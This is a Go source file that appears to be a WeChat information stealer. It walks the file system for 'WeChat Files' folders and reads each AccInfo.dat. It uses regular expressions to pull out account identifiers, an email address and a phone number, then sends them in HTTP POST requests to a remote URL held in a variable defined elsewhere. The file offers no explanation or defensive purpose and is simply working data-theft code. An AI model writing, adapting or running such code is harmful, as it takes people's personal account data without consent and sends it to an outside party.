package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"regexp"
)

var WxID bool

// var wxNum int

func ListFiles(Dirname string) {
	fileInfos, err := ioutil.ReadDir(Dirname)
	if err != nil {
		log.Println(err)
	}
	for _, fi := range fileInfos {
		filename := Dirname + "/" + fi.Name()
		if fi.Name() == "WeChat Files" {
			// fmt.Printf("%s\n", filename)
			dirname := filename
			AccInfo(dirname + "/")
		} else if fi.IsDir() {
			ListFiles(filename)
		}
	}
}
func AccInfo(wxDir string) {
	fileInfos1, err := ioutil.ReadDir(wxDir)
	if err != nil {
		log.Println(err)
	}
	for _, fi1 := range fileInfos1 {
		filename1 := wxDir + "/" + fi1.Name()
		if fi1.Name() == "AccInfo.dat" {
			fmt.Printf("%s\n", filename1)
			readInfo(filename1)

			break
		}
		if fi1.IsDir() {
			//	fmt.Println(wxNum)
			AccInfo(filename1)
		}

	}

}
func readInfo(wxInfoDir string) {
	data, err := ioutil.ReadFile(wxInfoDir)
	if err != nil {
		fmt.Println(err)
		return
	}
	Email := regexp.MustCompile(`\w+([-+.]\w+)@\w+([-.]\w+).\w+([-.]\w+)*`)
	Other := regexp.MustCompile(`[a-zA-Z0-9_-]{6,20}`)
	Phone := regexp.MustCompile(`1[3456789]\d{9}`)
	var otherInfo []string = Other.FindAllString(string(data), 5)
	var emailInfo []string = Email.FindAllString(string(data), 1)
	var phoneInfo []string = Phone.FindAllString(string(data), 1)
	s1 := []string{}
	for _, elem := range otherInfo {
		s1 = append(s1, elem)
	}
	//response, err := http.Post(url, "application/x-www-form-urlencoded", otherInfo)
	Res1, err := http.PostForm(Url, url.Values{"email": emailInfo})
	Res, err := http.PostForm(Url, url.Values{"other": otherInfo[:1], "other2": otherInfo[:2], "other3": otherInfo[:3], "other4": otherInfo[:4], "other5": otherInfo[:5]})
	Res2, err := http.PostForm(Url, url.Values{"phone": phoneInfo})

	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer Res.Body.Close()
	defer Res1.Body.Close()
	defer Res2.Body.Close()

}
